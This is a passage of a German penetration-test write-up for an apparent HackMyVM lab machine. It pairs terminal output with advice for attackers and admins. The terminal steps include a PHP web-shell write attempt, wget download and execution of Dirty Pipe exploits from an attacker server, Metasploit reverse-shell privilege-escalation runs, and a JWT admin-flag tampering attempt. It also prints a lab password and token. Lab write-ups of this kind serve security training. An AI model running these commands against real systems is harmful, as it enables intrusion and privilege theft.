+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">MariaDB [padding]> <span class="command">SELECT "&lt;?php system($REQUEST['ben']); ?&gt;" INTO OUTFILE "/var/www/html/ben.php";</span></div>
+                    <pre><span class="password">ERROR 1045 (28000): Access denied for user 'padding'@'localhost' (using password: YES)</span></pre>
+                    <div class="prompt">MariaDB [padding]> <span class="command">SELECT "&lt;?php system($REQUEST['ben']); ?&gt;" INTO OUTFILE "/var/www/cookie/ben.php";</span></div>
+                    <pre><span class="password">ERROR 1045 (28000): Access denied for user 'padding'@'localhost' (using password: YES)</span></pre>
+
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Die SSH-Konfigurationsdatei `/etc/ssh/sshd_config` wird mit `cat` gelesen und mit `grep` nach der Direktive `PermitRootLogin` durchsucht.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Ausgabe zeigt `<span class="password">PermitRootLogin yes</span>`. Dies bedeutet, dass direkte SSH-Logins als Root-Benutzer grundsätzlich erlaubt sind, sofern das Passwort bekannt ist oder ein entsprechender SSH-Schlüssel hinterlegt ist. Dies stellt ein erhöhtes Sicherheitsrisiko dar.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wenn das Root-Passwort bekannt wird oder erraten werden kann, wäre ein direkter SSH-Login als Root möglich. Dies ist jedoch oft schwierig. Konzentrieren Sie sich weiterhin auf andere Eskalationsmethoden.
+            <br><strong>Empfehlung (Admin):</strong> Ändern Sie `PermitRootLogin` in `/etc/ssh/sshd_config` auf `no` oder zumindest auf `prohibit-password` (erlaubt nur Schlüssel-basierten Root-Login). Es ist generell sicherer, sich zuerst als normaler Benutzer anzumelden und dann mittels `su` oder `sudo` zu Root zu wechseln.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">dyutidhara@kitty:/tmp$ <span class="command">cat /etc/ssh/sshd_config | grep PermitRootLogin</span></div>
+                    <pre>
+<span class="password">PermitRootLogin yes</span>
+# the setting of "PermitRootLogin without-password".
+</pre>
+                </div>
+            </div>
+
+
+             <p class="analysis"><strong>Analyse:</strong> Mit `grep -ri "passw" .` wird rekursiv (`r`) und case-insensitiv (`i`) im aktuellen Verzeichnis (`.`) und allen Unterverzeichnissen nach Dateien gesucht, die die Zeichenkette "passw" enthalten. Dies ist ein Versuch, vergessene Passwörter oder Zugangsdaten in Skripten, Konfigurationsdateien oder Logs zu finden.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Befehl selbst ist sinnvoll, aber die Ausgabe wird im Bericht nicht gezeigt. Es ist unklar, ob relevante Funde gemacht wurden. Solche Suchen können oft zu vielen irrelevanten Ergebnissen führen (False Positives), aber manchmal auch wertvolle Hinweise liefern.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie ähnliche Suchen in relevanten Verzeichnissen durch (z.B. `/etc`, `/var/www`, `/home`, `/opt`). Suchen Sie nach spezifischeren Begriffen wie `password`, `secret`, `apikey`, `zugang`. Analysieren Sie die Ergebnisse sorgfältig.
+             <br><strong>Empfehlung (Admin):</strong> Speichern Sie niemals Passwörter oder sensible Daten im Klartext in Dateien. Verwenden Sie sichere Speicherungsmechanismen (Vaults, Konfigurationsmanagement-Systeme mit Verschlüsselung). Überprüfen Sie regelmäßig Dateisysteme auf versehentlich gespeicherte Zugangsdaten.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">dyutidhara@kitty:/tmp$ <span class="command">grep -ri "passw" .</span></div>
+                    <pre>
+<span class="comment">[Ausgabe nicht im Bericht enthalten]</span>
+</pre>
+                </div>
+            </div>
+
+
+            <p class="analysis"><strong>Analyse:</strong> Hier werden mehrere Schritte durchgeführt:
+            <ol><li>Ein Skript namens `dirtychecker.sh` wird von einem vom Angreifer kontrollierten Webserver (192.168.2.153:8000) heruntergeladen.</li><li>Das Skript wird ausführbar gemacht (`chmod +x`).</li><li>Das Skript wird ausgeführt (`./dirtychecker.sh`).</li></ol>
+            Parallel dazu läuft auf dem Angreifer-System (vermutlich 192.168.2.153) ein einfacher Python-HTTP-Server, um die Datei bereitzustellen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Skript `dirtychecker.sh` prüft offenbar auf die "Dirty Pipe"-Schwachstelle (CVE-2022-0847), eine Kernel-Schwachstelle zur Rechteausweitung. Die Ausgabe `<span class="password">Vulnerable</span>` zeigt an, dass das Zielsystem für diese Schwachstelle anfällig ist. Dies ist ein vielversprechender Vektor für die Privilege Escalation. Der Python-Server-Log bestätigt den erfolgreichen Download.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+            <ol><li>Suchen Sie nach einem funktionierenden Exploit für CVE-2022-0847 (Dirty Pipe) für die spezifische Kernel-Version des Ziels (5.10.0-13-amd64).</li><li>Laden Sie den Exploit auf das Zielsystem hoch, kompilieren Sie ihn gegebenenfalls und führen Sie ihn aus, um Root-Rechte zu erlangen.</li></ol>
+            <strong>Empfehlung (Admin):</strong>
+            <ol><li>Patchen Sie das System sofort, um die Dirty Pipe-Schwachstelle (CVE-2022-0847) zu beheben. Aktualisieren Sie den Linux-Kernel auf eine nicht anfällige Version.</li><li>Beschränken Sie die Möglichkeit, Dateien aus dem Internet herunterzuladen und auszuführen, wenn dies nicht notwendig ist.</li><li>Überwachen Sie ausgehende Netzwerkverbindungen vom Server.</li></ol></p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">dyutidhara@kitty:/tmp$ <span class="command">wget http://192.168.2.153:8000/dirtychecker.sh; chmod +x dirtychecker.sh;./dirtychecker.sh</span></div>
+                     <pre>
+--2022-10-20 08:42:00--  http://192.168.2.153:8000/dirtychecker.sh
+<span class="password">Connecting to 192.168.2.153:8000... connected.</span>
+HTTP request sent, awaiting response... 200 OK
+Length: 814 [text/x-sh]
+Saving to: ‘dirtychecker.sh’
+
+dirtychecker.sh               100%[&lt;===================&gt;]     814  --.-KB/s    in 0s
+
+<span class="password">2022-10-20 08:42:00 (9.85 MB/s) - ‘dirtychecker.sh’ saved [814/814]</span>
+
+5 10 0
+<span class="password">Vulnerable</span></pre>
+                </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/HackingTools]
+└─# <span class="command">python3 -m http.server</span></div>
+                     <pre>Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+<span class="password">192.168.2.100 - - [20/Oct/2022 14:42:01] "GET /dirtychecker.sh HTTP/1.1" 200 -</span></pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Nachdem die Anfälligkeit für Dirty Pipe bestätigt wurde, werden zwei Exploit-Dateien (`exploit-1`, `exploit-2`) vom Angreifer-Server heruntergeladen und ausführbar gemacht. Es handelt sich wahrscheinlich um vorkompilierte Exploits für CVE-2022-0847.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Das Herunterladen der Exploits ist der nächste logische Schritt nach der Identifizierung der Schwachstelle. Das Vorhandensein von zwei Versionen könnte darauf hindeuten, dass unterschiedliche Varianten oder Techniken ausprobiert werden sollen. Das Ziel ist es, einen dieser Exploits auszuführen, um Root-Rechte zu erlangen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie einen der heruntergeladenen Exploits aus (z.B. `./exploit-1`). Wenn dieser nicht funktioniert, versuchen Sie den anderen (`./exploit-2`). Überprüfen Sie nach der Ausführung mit `id`, ob Sie Root-Rechte erhalten haben.
+             <br><strong>Empfehlung (Admin):</strong> (Siehe vorherige Empfehlung zu Dirty Pipe) Verhindern Sie das Herunterladen und Ausführen von nicht vertrauenswürdigen Binärdateien. Verwenden Sie AppArmor oder SELinux, um die Ausführung von Programmen in schreibbaren Verzeichnissen wie `/tmp` einzuschränken.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">dyutidhara@kitty:/tmp$ <span class="command">wget http://192.168.2.153:8000/exploit-2</span></div>
+                    <pre>
+--2022-10-20 08:46:07--  http://192.168.2.153:8000/exploit-2
+Connecting to 192.168.2.153:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 17288 (17K) [application/octet-stream]
+Saving to: ‘exploit-2’
+
+exploit-2                     100%[&lt;===================&gt;]  16.88K  --.-KB/s    in 0s
+
+<span class="password">2022-10-20 08:46:07 (299 MB/s) - ‘exploit-2’ saved [17288/17288]</span>
+</pre>
+                    <div class="prompt">dyutidhara@kitty:/tmp$ <span class="command">wget http://192.168.2.153:8000/exploit-1</span></div>
+                    <pre>
+--2022-10-20 08:46:10--  http://192.168.2.153:8000/exploit-1
+Connecting to 192.168.2.153:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 16880 (16K) [application/octet-stream]
+Saving to: ‘exploit-1’
+
+exploit-1                     100%[&lt;===================&gt;]  16.48K  --.-KB/s    in 0s
+
+<span class="password">2022-10-20 08:46:10 (144 MB/s) - ‘exploit-1’ saved [16880/16880]</span>
+</pre>
+                    <div class="prompt">dyutidhara@kitty:/tmp$ <span class="command">chmod +x exploit-1;chmod +x exploit-2;</span></div>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Hier wird versucht, einen Metasploit-Exploit (`exploit/linux/local/netfilter_priv_esc_ipv4`) zu verwenden, der eine Schwachstelle im Netfilter-Subsystem des Linux-Kernels ausnutzt (CVE-2021-22555, nicht Dirty Pipe). Dies erfordert eine bestehende Meterpreter-Sitzung oder Shell-Sitzung auf dem Ziel. Die Optionen werden konfiguriert (`LHOST`, `LPORT`, `SESSION`) und der Exploit mehrmals gestartet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Versuche scheitern.
+            <ul><li>Erster Versuch (`run`): Fehler, da die `SESSION`-Option nicht gesetzt ist.</li><li>Zweiter Versuch (`run` nach `set session 4`): Exploit startet, aber scheitert, da die notwendigen 32-Bit-Bibliotheken und Multilib-Compiler-Tools auf dem Ziel fehlen (`libc6-dev-i386`, `gcc-multilib`). Metasploit versucht, einen vorkompilierten Exploit zu verwenden, aber dieser funktioniert nicht oder wird unterbrochen. Die Meldung `<span class="password">Meterpreter session 2 closed. Reason: Died</span>` deutet auf ein Problem mit einer anderen, nicht gezeigten Sitzung hin.</li><li>Dritter Versuch (`run` nach Portänderung): Ähnliches Ergebnis, der Exploit wird unterbrochen.</li></ul>
+            Der `local_exploit_suggester` von Metasploit (Ausgabe beginnt mit `=`) listet zwar `netfilter_priv_esc_ipv4` und `cve_2022_0847_dirtypipe` als potenziell anfällig auf, aber der Netfilter-Exploit funktioniert hier aufgrund der fehlenden Abhängigkeiten oder anderer Inkompatibilitäten nicht.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Da der Metasploit-Netfilter-Exploit fehlschlägt und der Dirty-Pipe-Exploit erfolgversprechender aussieht (und bereits heruntergeladen wurde), sollte dieser priorisiert werden. Falls die vorkompilierten Dirty-Pipe-Exploits (`exploit-1`, `exploit-2`) nicht funktionieren, suchen Sie nach dem Quellcode und versuchen Sie, ihn direkt auf dem Ziel zu kompilieren (falls `gcc` installiert ist). Der `local_exploit_suggester` kann weitere Ideen liefern, falls Dirty Pipe fehlschlägt.
+            <br><strong>Empfehlung (Admin):</strong> Halten Sie das System gepatcht, um sowohl CVE-2021-22555 als auch CVE-2022-0847 zu mitigieren. Installieren Sie keine Entwicklungs-Tools (Compiler, Bibliotheken) auf Produktionsservern, wenn sie nicht unbedingt benötigt werden, da sie Angreifern das Kompilieren von Exploits erleichtern können.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) &gt; <span class="command">use exploit/linux/local/netfilter_priv_esc_ipv4</span></div>
+                    <pre>[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp</pre>
+                    <div class="prompt metasploit-prompt">msf6 exploit(linux/local/netfilter_priv_esc_ipv4) &gt; <span class="command">options</span></div>
+<pre>
+Module options (exploit/linux/local/netfilter_priv_esc_ipv4):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   COMPILE    Auto             yes       Compile on target (Accepted: Auto, True, False)
+   MAXWAIT    180              yes       Max seconds to wait for decrementation in seconds
+   REEXPLOIT  false            yes       desc already ran, no need to re-run, skip to running pwn
+   SESSION                     yes       The session to run this module on
+
+
+Payload options (linux/x64/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.2.153    yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Ubuntu
+
+</pre>
+                    <div class="prompt metasploit-prompt">msf6 exploit(linux/local/netfilter_priv_esc_ipv4) &gt; <span class="command">set lhost 192.168.2.153</span></div>
+                    <pre>lhost =&gt; 192.168.2.153</pre>
+                    <div class="prompt metasploit-prompt">msf6 exploit(linux/local/netfilter_priv_esc_ipv4) &gt; <span class="command">set lport 4445</span></div>
+                    <pre>lport =&gt; 4445</pre>
+                    <div class="prompt metasploit-prompt">msf6 exploit(linux/local/netfilter_priv_esc_ipv4) &gt; <span class="command">run</span></div>
+<pre>
+<span class="password">[-] Msf::OptionValidateError The following options failed to validate: SESSION</span></pre>
+                    <div class="prompt metasploit-prompt">msf6 exploit(linux/local/netfilter_priv_esc_ipv4) &gt; <span class="command">set session 4</span></div>
+                    <pre>session =&gt; 4</pre>
+                    <div class="prompt metasploit-prompt">msf6 exploit(linux/local/netfilter_priv_esc_ipv4) &gt; <span class="command">run</span></div>
+<pre>
+[*] Started reverse TCP handler on 192.168.2.153:4445
+<span class="password">[-] libc6-dev-i386 is not installed.  Compiling will fail.</span>
+<span class="password">[-] gcc-multilib is not installed.  Compiling will fail.</span>
+^C<span class="password">[-] Exploit failed [user-interrupt]: Interrupt</span>
+<span class="password">[-] run: Interrupted</span></pre>
+                    <div class="prompt metasploit-prompt">msf6 exploit(linux/local/netfilter_priv_esc_ipv4) &gt; <span class="command">set verbose true</span></div>
+                    <pre>verbose =&gt; true</pre>
+                    <div class="prompt metasploit-prompt">msf6 exploit(linux/local/netfilter_priv_esc_ipv4) &gt; <span class="command">run</span></div>
+<pre>
+[*] Started reverse TCP handler on 192.168.2.153:4445
+[*] Checking if ip_tables is loaded in kernel
+[+] ip_tables.ko is loaded
+[+] SMEP is not enabled
+[+] SMAP is not enabled
+[+] Unprivileged user namespaces are permitted
+[*] Checking if 32bit C libraries, gcc-multilib, and gcc are installed
+<span class="password">[-] libc6-dev-i386 is not installed.  Compiling will fail.</span>
+<span class="password">[-] gcc-multilib is not installed.  Compiling will fail.</span>
+[+] gcc is installed
+[*] Dropping pre-compiled exploit on system
+[*] Executing /tmp/Z7WtwIUL, may take around 35s to finish.  Watching for /tmp/okDjTFSS to be created.
+[*] Waited 0s so far
+[*] Waited 10s so far
+[*] Waited 20s so far
+[*] Waited 30s so far
+[*] Waited 40s so far
+[*] Waited 50s so far
+[*] Waited 60s so far
+<span class="password">[*] 192.168.2.100 - Meterpreter session 2 closed.  Reason: Died</span>
+[*] Waited 70s so far
+[*] Waited 80s so far
+[*] Waited 90s so far
+[*] Waited 100s so far
+^C<span class="password">[-] Exploit failed [user-interrupt]: Interrupt</span>
+<span class="password">[-] run: Interrupted</span></pre>
+                    <div class="prompt metasploit-prompt">msf6 exploit(linux/local/netfilter_priv_esc_ipv4) &gt; <span class="command">unset lport</span></div>
+                    <pre>Unsetting lport...</pre>
+                    <div class="prompt metasploit-prompt">msf6 exploit(linux/local/netfilter_priv_esc_ipv4) &gt; <span class="command">set lport 4444</span></div>
+                    <pre>lport =&gt; 4444</pre>
+                    <div class="prompt metasploit-prompt">msf6 exploit(linux/local/netfilter_priv_esc_ipv4) &gt; <span class="command">run</span></div>
+<pre>
+[*] Started reverse TCP handler on 192.168.2.153:4444
+[*] Checking if ip_tables is loaded in kernel
+[+] ip_tables.ko is loaded
+[+] SMEP is not enabled
+[+] SMAP is not enabled
+[+] Unprivileged user namespaces are permitted
+[*] Checking if 32bit C libraries, gcc-multilib, and gcc are installed
+<span class="password">[-] libc6-dev-i386 is not installed.  Compiling will fail.</span>
+<span class="password">[-] gcc-multilib is not installed.  Compiling will fail.</span>
+[+] gcc is installed
+[*] Dropping pre-compiled exploit on system
+[*] Executing /tmp/qdSNyIc4, may take around 35s to finish.  Watching for /tmp/okDjTFSS to be created.
+[*] Waited 0s so far
+[*] Waited 10s so far
+[...]
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Diese Ausgabe stammt vermutlich vom Metasploit `local_exploit_suggester` oder einem ähnlichen Enumerationsskript. Es listet potenzielle lokale Privilege Escalation Exploits basierend auf dem Zielsystem auf.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Das Skript identifiziert mehrere potenzielle Schwachstellen:
+             <ol><li>`cve_2022_0847_dirtypipe`: Bestätigt die vorherige Analyse (<span class="password">Yes, appears vulnerable</span>).</li><li>`netfilter_priv_esc_ipv4`: Bestätigt die vorherige Analyse (<span class="password">Yes, appears vulnerable</span>), obwohl der Exploit fehlschlug.</li><li>`pkexec`: Bezieht sich auf PwnKit (CVE-2021-4034). Das `pkexec`-Binary existiert (wie im `find`-Befehl gesehen), aber der Suggester kann nicht sicher validieren, ob es anfällig ist (<span class="password">Yes, could not be validated</span>).</li><li>`su_login`: Eine ältere Schwachstelle (<span class="password">Yes, appears vulnerable</span>).</li><li>`ubuntu_enlightenment_mount_priv_esc`: Eine spezifische Ubuntu-Schwachstelle (<span class="password">Yes, appears vulnerable</span>).</li></ol>
+             Diese Liste gibt mehrere Ansatzpunkte, wobei Dirty Pipe am vielversprechendsten erscheint.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Priorisieren Sie den Dirty Pipe Exploit. Falls dieser fehlschlägt, untersuchen Sie PwnKit für `pkexec` (Version prüfen, Exploit suchen/kompilieren). Die anderen Schwachstellen sind möglicherweise weniger wahrscheinlich oder erfordern spezifischere Bedingungen.
+             <br><strong>Empfehlung (Admin):</strong> Patchen Sie das System umfassend, um alle diese bekannten Schwachstellen (Dirty Pipe, PwnKit, Netfilter etc.) zu schließen. Halten Sie das Betriebssystem und alle Pakete auf dem neuesten Stand.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>
+<span class="comment">=[ Metasploit local_exploit_suggester oder ähnliches Skript ]=</span>
+
+ #   Name                                                               Potentially Vulnerable?  Check Result
+ -   ----                                                               -----------------------  ------------
+ 1   <span class="command">exploit/linux/local/cve_2022_0847_dirtypipe</span>                        <span class="password">Yes</span>                      The target appears to be vulnerable. Linux kernel version found: 5.10.0
+ 2   <span class="command">exploit/linux/local/netfilter_priv_esc_ipv4</span>                        <span class="password">Yes</span>                      The target appears to be vulnerable.
+ 3   <span class="command">exploit/linux/local/pkexec</span>                                         <span class="password">Yes</span>                      The service is running, but could not be validated.
+ 4   <span class="command">exploit/linux/local/su_login</span>                                       <span class="password">Yes</span>                      The target appears to be vulnerable.
+ 5   <span class="command">exploit/linux/local/ubuntu_enlightenment_mount_priv_esc</span>            <span class="password">Yes</span>                      The target appears to be vulnerable.
+</pre>
+                 </div>
+             </div>
+
+
+             <p class="analysis"><strong>Analyse:</strong> Diese Zeilen scheinen zufällige Schnipsel oder Notizen aus der Enumerationsphase zu sein. Sie listen potenzielle interessante Pfade, Befehle oder Hostnamen auf.</p>
+             <p class="evaluation"><strong>Bewertung:</strong>
+             <ul><li>`/usr/local/bin/gitea web -c /etc/gitea/app.ini`: Startbefehl für Gitea.</li><li>`/bin/passwd`: SUID-Binary, bereits bekannt.</li><li>`nc -uU /tmp/socket`: Netcat-Befehl zum Verbinden mit einem Unix-Socket. Kontext unklar.</li><li>`jwt.hmv`: Möglicherweise ein weiterer Hostname oder eine Datei im Zusammenhang mit JSON Web Tokens.</li><li>`/usr/bin/gpg`: GNU Privacy Guard Binary.</li><li>`127.0.0.1:8000`: Lokaler Dienst, wahrscheinlich die API oder ein weitergeleiteter Port.</li></ul>
+             Diese Schnipsel allein bieten keine direkten Angriffspunkte, könnten aber im Kontext anderer Funde relevant sein.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfen Sie, ob `jwt.hmv` ein auflösbarer Hostname ist oder ob eine Datei dieses Namens existiert. Untersuchen Sie, wofür der Unix-Socket `/tmp/socket` verwendet wird, falls er existiert.
+             <br><strong>Empfehlung (Admin):</strong> Bereinigen Sie unnötige Dateien oder Notizen auf dem System.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+/usr/local/bin/gitea web -c /etc/gitea/app.ini
+/bin/passwd
+nc -uU /tmp/socket
+jwt.hmv
+/usr/bin/gpg
+127.0.0.1:8000
+</pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Diese Ausgabe stammt wahrscheinlich von einem Skript wie `LinPEAS` oder einer manuellen Überprüfung der Linux Capabilities. Capabilities sind eine Methode, um Root-Berechtigungen feingranularer zu vergeben, als es mit SUID möglich ist.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Umgebung (`Current env capabilities`) und der aktuelle Prozess (`Current proc capabilities`) haben keine besonderen Capabilities gesetzt. Die "Parent Shell" ebenfalls nicht. Es werden jedoch zwei Dateien mit Capabilities gefunden:
+             <ul><li>`/usr/bin/ping`: Hat `cap_net_raw=ep` (Effective, Permitted). Erlaubt das Senden von rohen Netzwerkpaketen, was für Ping notwendig ist.</li><li>`/usr/lib/.../gst-ptp-helper`: Hat `cap_net_bind_service,cap_net_admin=ep`. Erlaubt das Binden an privilegierte Ports (&lt;1024) und Netzwerkkonfigurationsänderungen.</li></ul>
+             Keine dieser Capabilities scheint direkt für eine Rechteausweitung ausnutzbar zu sein, es sei denn, es gibt eine bekannte Schwachstelle in `gst-ptp-helper`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Capabilities sind hier wahrscheinlich kein erfolgversprechender Vektor. Konzentrieren Sie sich auf andere Methoden wie den Cronjob oder Kernel-Exploits.
+             <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie regelmäßig die gesetzten Capabilities auf dem System (`getcap -r / 2>/dev/null`). Vergeben Sie Capabilities nur, wenn sie unbedingt notwendig sind. Halten Sie Pakete wie GStreamer (`gst-ptp-helper`) aktuell.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+<span class="comment">╔══════════╣ Capabilities
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities</span>
+Current env capabilities:
+Current: =
+Current proc capabilities:
+CapInh:	0000000000000000
+CapPrm:	0000000000000000
+CapEff:	0000000000000000
+CapBnd:	000001ffffffffff
+CapAmb:	0000000000000000
+
+Parent Shell capabilities:
+0x0000000000000000=
+
+Files with capabilities (limited to 50):
+<span class="command">/usr/bin/ping cap_net_raw=ep</span>
+<span class="command">/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep</span>
+</pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Hier wird eine SSH-Portweiterleitung eingerichtet. Der Befehl `ssh -L 8000:127.0.0.1:8000 dyutidhara@kitty -i ssh.kitty` leitet Verbindungen, die auf Port 8000 des lokalen Angreifer-Systems eingehen, über den SSH-Tunnel zum Port 8000 auf dem Zielsystem (`kitty`, auf dessen Loopback-Interface `127.0.0.1`). Es wird ein SSH-Schlüssel `ssh.kitty` verwendet (vermutlich derselbe wie `idr`/`iiii`).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies ist nützlich, um auf Dienste zuzugreifen, die auf dem Zielsystem nur auf `localhost` lauschen (wie die API auf Port 3000, die vermutlich auf Port 8000 weitergeleitet wird, oder eine andere lokale Anwendung). Die Warnung bezüglich des Host-Schlüssels erscheint, da der Hostname `kitty` nun über eine andere IP (die des Zielsystems statt der vorherigen `192.168.2.150`) angesprochen wird oder der Schlüssel sich geändert hat. Der Login als `dyutidhara` ist erfolgreich.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Greifen Sie nun auf `http://localhost:8000` auf Ihrem Angreifer-System zu, um die Anwendung zu erreichen, die auf Port 8000 des Zielsystems lauscht. Untersuchen Sie diese Anwendung auf Schwachstellen oder Informationen.
+             <br><strong>Empfehlung (Admin):</strong> Beschränken Sie SSH-Portweiterleitungen serverseitig (`AllowTcpForwarding no` in `sshd_config`), wenn sie nicht benötigt werden. Überwachen Sie SSH-Logins und -Aktivitäten.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh -L 8000:127.0.0.1:8000 dyutidhara@kitty -i ssh.kitty</span></div>
+                    <pre>
+The authenticity of host 'kitty (192.168.2.107)' can't be established.
+ED25519 key fingerprint is SHA256:hyaH0n5p7+5xBVQEL/hRIeVRNWsLv8qjefRknYQi6Q.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:33: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'kitty' (ED25519) to the list of known hosts.
+Linux kitty 5.10.0-13-amd64 #1 SMP Debian 5.10.106-1 (2022-03-17) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+<span class="password">Last login: Wed Nov  9 19:37:46 2022 from 192.168.2.109</span>
+<span class="prompt">dyutidhara@kitty:~$ </span></pre>
+                </div>
+            </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Nach Einrichtung der Portweiterleitung wird `curl` verwendet, um auf `http://localhost:8000/` (auf dem Angreifer-System, was zum Zielsystem weitergeleitet wird) zuzugreifen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Antwort ist HTML-Code für eine Swagger UI-Dokumentationsseite. Swagger UI wird verwendet, um RESTful APIs zu dokumentieren und interaktiv zu testen. Dies bestätigt, dass auf Port 8000 des Zielsystems eine API läuft (wahrscheinlich die "whythisapiissofast"-API) und dass sie ihre eigene Dokumentation bereitstellt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Öffnen Sie `http://localhost:8000` in einem Browser auf Ihrem Angreifer-System. Untersuchen Sie die API-Dokumentation in der Swagger UI. Suchen Sie nach interessanten Endpunkten, insbesondere solchen, die Authentifizierung umgehen, Informationen preisgeben oder Aktionen ermöglichen könnten (z.B. Benutzerverwaltung, Dateiupload/-download). Die Endpunkte `-1` und `-2` wurden bereits gefunden, aber es könnte weitere geben.
+             <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass API-Dokumentationen wie Swagger UI nicht versehentlich sensible Informationen oder undokumentierte, unsichere Endpunkte preisgeben. Schützen Sie den Zugriff auf die API und ihre Dokumentation angemessen, insbesondere in Produktionsumgebungen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl -X GET "0.0.0.0:8000/"</span></div>
+                    <pre>
+    &lt;!DOCTYPE html&gt;
+    &lt;html&gt;
+    &lt;head&gt;
+    &lt;link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swagger-ui-dist@3/swagger-ui.css"&gt;
+    &lt;link rel="shortcut icon" href="https://fastapi.tiangolo.com/img/favicon.png"&gt;
+    &lt;title&gt;HackMyVM API - Swagger UI&lt;/title&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+    &lt;div id="swagger-ui"&gt;
+    &lt;/div&gt;
+    &lt;script src="https://cdn.jsdelivr.net/npm/swagger-ui-dist@3/swagger-ui-bundle.js"&gt;&lt;/script&gt;
+    &lt;!-- `SwaggerUIBundle` is now available on the page --&gt;
+    &lt;script&gt;
+    const ui = SwaggerUIBundle({
+        url: '/openapi.json',
+    "dom_id": "#swagger-ui",
+"layout": "BaseLayout",
+"deepLinking": true,
+"showExtensions": true,
+"showCommonExtensions": true,"defaultModelsExpandDepth": -1,
+
+oauth2RedirectUrl: window.location.origin + '/docs/oauth2-redirect',
+    presets: [
+        SwaggerUIBundle.presets.apis,
+        SwaggerUIBundle.SwaggerUIStandalonePreset
+        ],
+    })
+    &lt;/script&gt;
+    &lt;/body&gt;
+    &lt;/html&gt;
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Hier wird versucht, sich über den API-Endpunkt `/api/v2/user/login` anzumelden. Es wird ein POST-Request mit JSON-Daten gesendet. In diesem Fall werden die zuvor gefundenen Zugangsdaten (`nobody`:`74k3!7345y`) verwendet, aber zusätzlich wird `is_admin: 1` im JSON-Payload gesendet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die API gibt einen `access_token` zurück: `<span class="password">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Im5vYm9keSIsImlzX2FkbWluIjowLCJleHBpcmVzIjoxNjY4MDQ1Nzk3LjA3NzMxNTN9.agtlUqaQV0yYmBZYvFRyCcz5hj_Ztj86e3Db1L7oBYg</span>`. Dies ist ein JSON Web Token (JWT). Obwohl im Request `is_admin: 1` gesendet wurde, enthält der Payload des zurückgegebenen Tokens (der zweite Teil, base64-dekodiert) `"is_admin":0`. Das bedeutet, der Versuch, sich selbst Admin-Rechte zu geben, wurde von der API ignoriert oder überschrieben. Der Login als `nobody` war jedoch erfolgreich.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
